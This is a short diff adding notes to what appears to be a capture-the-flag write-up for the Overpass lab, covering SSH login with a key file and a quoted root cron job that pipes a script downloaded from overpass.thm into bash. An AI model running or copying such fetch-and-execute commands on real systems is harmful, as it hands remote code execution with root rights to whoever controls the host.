@@ -17,3 +17,7 @@ ssh -i encryptedKey james@$ip
 chmod 600 encryptedKey
 
 # Login success
+### cron is your friend
+```
+root curl overpass.thm/downloads/src/buildscript.sh | bash
+```
